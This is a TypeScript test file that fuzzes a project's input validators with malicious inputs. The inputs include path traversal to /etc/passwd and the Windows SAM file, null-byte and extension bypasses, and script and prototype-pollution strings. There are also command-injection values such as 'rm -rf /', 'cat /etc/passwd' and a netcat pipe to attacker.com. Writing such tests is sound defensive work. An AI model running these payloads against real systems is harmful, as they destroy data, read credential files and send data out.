/**
 * Security Fuzzing Tests
 * Test input validation against malicious inputs
 */

import {
  validatePort,
  validateFilePath,
  validateFileExists,
  validateSchema,
  validateLogLevel,
  validateProjectName,
  sanitizeString
} from '../src/utils/validation';
import { ValidationError, FileError } from '../src/errors';

describe('Security Fuzzing Tests', () => {
  describe('Path Traversal Attacks', () => {
    const maliciousPaths = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32',
      '/etc/passwd',
      'C:\\Windows\\System32\\config\\SAM',
      '....//....//....//etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%252F..%252F..%252Fetc%252Fpasswd',
      '..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
      '/var/www/../../etc/passwd',
      'file:///etc/passwd',
      '\\\\?\\C:\\Windows\\System32',
    ];

    maliciousPaths.forEach(path => {
      it(`should reject path traversal: ${path}`, () => {
        expect(() => validateFilePath(path)).toThrow(ValidationError);
      });
    });
  });

  describe('Null Byte Injection', () => {
    const nullByteInputs = [
      'file.json\x00.txt',
      '/path/to/file\x00',
      'schema.json\0malicious',
    ];

    nullByteInputs.forEach(input => {
      it(`should reject null byte: ${JSON.stringify(input)}`, () => {
        expect(() => validateFilePath(input)).toThrow(ValidationError);
      });
    });
  });

  describe('Control Character Injection', () => {
    it('should remove control characters from strings', () => {
      const malicious = 'test\x01\x02\x03\x04\x05string';
      const sanitized = sanitizeString(malicious);
      expect(sanitized).not.toMatch(/[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]/);
    });

    it('should preserve newlines and tabs', () => {
      const text = 'line1\nline2\ttabbed';
      const sanitized = sanitizeString(text);
      expect(sanitized).toContain('\n');
      expect(sanitized).toContain('\t');
    });
  });

  describe('Port Number Fuzzing', () => {
    const invalidPorts = [
      -1, 0, 65536, 70000, 100000,
      NaN, Infinity, -Infinity,
      '65536a', 'port', null, undefined,
      1.5, -100, 2**16
    ];

    invalidPorts.forEach(port => {
      it(`should reject invalid port: ${port}`, () => {
        expect(() => validatePort(port as any)).toThrow(ValidationError);
      });
    });

    const validPorts = [1, 80, 443, 3000, 8080, 65535];
    
    validPorts.forEach(port => {
      it(`should accept valid port: ${port}`, () => {
        expect(validatePort(port)).toBe(port);
      });
    });
  });

  describe('Schema Injection', () => {
    it('should reject non-object schemas', () => {
      expect(() => validateSchema(null as any)).toThrow(ValidationError);
      expect(() => validateSchema(undefined as any)).toThrow(ValidationError);
      expect(() => validateSchema('string' as any)).toThrow(ValidationError);
      expect(() => validateSchema(123 as any)).toThrow(ValidationError);
      expect(() => validateSchema([] as any)).toThrow(ValidationError);
    });

    it('should reject schemas without type', () => {
      expect(() => validateSchema({} as any)).toThrow(ValidationError);
      expect(() => validateSchema({ properties: {} } as any)).toThrow(ValidationError);
    });

    it('should accept valid schemas', () => {
      const valid = { type: 'object', properties: {} };
      expect(() => validateSchema(valid)).not.toThrow();
    });
  });

  describe('String Length Attacks (DOS)', () => {
    it('should reject extremely long strings', () => {
      const longString = 'a'.repeat(10000);
      expect(() => sanitizeString(longString, 1000)).toThrow(ValidationError);
    });

    it('should accept strings within limit', () => {
      const normalString = 'a'.repeat(500);
      expect(() => sanitizeString(normalString, 1000)).not.toThrow();
    });
  });

  describe('Log Level Injection', () => {
    const maliciousLevels = [
      'debug; rm -rf /',
      'info && cat /etc/passwd',
      'error | nc attacker.com 1234',
      '<script>alert(1)</script>',
      '../../../etc/passwd',
      '\x00debug',
    ];

    maliciousLevels.forEach(level => {
      it(`should reject malicious log level: ${level}`, () => {
        expect(() => validateLogLevel(level)).toThrow(ValidationError);
      });
    });

    const validLevels = ['error', 'warn', 'info', 'debug'];
    
    validLevels.forEach(level => {
      it(`should accept valid log level: ${level}`, () => {
        expect(validateLogLevel(level)).toBe(level);
      });
    });
  });

  describe('Project Name Injection', () => {
    const maliciousNames = [
      '../../../etc/passwd',
      'project; rm -rf /',
      'name\x00malicious',
      'a'.repeat(200), // Too long
      '<script>alert(1)</script>',
      'name\n\rwith\nnewlines',
    ];

    maliciousNames.forEach(name => {
      it(`should reject/sanitize malicious name: ${name.substring(0, 50)}`, () => {
        // Should either throw or sanitize
        try {
          const result = validateProjectName(name);
          // If it doesn't throw, check it's been sanitized
          expect(result.length).toBeLessThanOrEqual(100);
          expect(result).not.toMatch(/[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]/);
        } catch (e) {
          expect(e).toBeInstanceOf(ValidationError);
        }
      });
    });

    const validNames = [
      'my-project',
      'myproject123',
      'valid-name',
      'project-2024',
    ];

    validNames.forEach(name => {
      it(`should accept valid project name: ${name}`, () => {
        expect(() => validateProjectName(name)).not.toThrow();
      });
    });
  });

  describe('File Extension Bypass', () => {
    const bypassAttempts = [
      'file.json.exe',
      'file.json%00.exe',
      'file.json\x00.exe',
      'file.json.....exe',
      'file.json/../../etc/passwd',
    ];

    bypassAttempts.forEach(path => {
      it(`should reject file extension bypass: ${path}`, () => {
        expect(() => validateFilePath(path)).toThrow();
      });
    });
  });

  describe('Special Character Injection', () => {
    const specialChars = [
      'file|whoami.json',
      'file`whoami`.json',
      'file$(whoami).json',
      'file;whoami;.json',
      'file&whoami&.json',
    ];

    specialChars.forEach(input => {
      it(`should sanitize special characters: ${input}`, () => {
        const result = sanitizeString(input);
        // Should not contain dangerous characters for shell injection
        expect(result).not.toMatch(/[|`$;&]/);
      });
    });
  });

  describe('Unicode and Encoding Attacks', () => {
    const unicodeAttacks = [
      'file\u202e.json', // Right-to-left override
      'file\u200b.json', // Zero-width space
      'file\ufeff.json', // Zero-width no-break space
      '../\u2044..\u2044etc\u2044passwd', // Unicode slash
    ];

    unicodeAttacks.forEach(input => {
      it(`should handle unicode attack: ${JSON.stringify(input)}`, () => {
        const result = sanitizeString(input);
        // Should normalize or remove dangerous unicode
        expect(result.length).toBeGreaterThanOrEqual(0);
      });
    });
  });

  describe('Type Confusion', () => {
    it('should handle type confusion in port validation', () => {
      expect(() => validatePort({} as any)).toThrow();
      expect(() => validatePort([] as any)).toThrow();
      expect(() => validatePort(true as any)).toThrow();
      expect(() => validatePort(Symbol('port') as any)).toThrow();
    });

    it('should handle type confusion in string sanitization', () => {
      expect(() => sanitizeString({} as any)).toThrow();
      expect(() => sanitizeString([] as any)).toThrow();
      expect(() => sanitizeString(123 as any)).toThrow();
    });
  });

  describe('Prototype Pollution Prevention', () => {
    it('should not allow __proto__ in file paths', () => {
      expect(() => validateFilePath('__proto__.json')).toThrow();
      expect(() => validateFilePath('file/__proto__/schema.json')).toThrow();
    });

    it('should not allow constructor in paths', () => {
      expect(() => validateFilePath('constructor.json')).toThrow();
      expect(() => validateFilePath('file/constructor/schema.json')).toThrow();
    });

    it('should not allow prototype in paths', () => {
      expect(() => validateFilePath('prototype.json')).toThrow();
      expect(() => validateFilePath('file/prototype/schema.json')).toThrow();
    });
  });
});
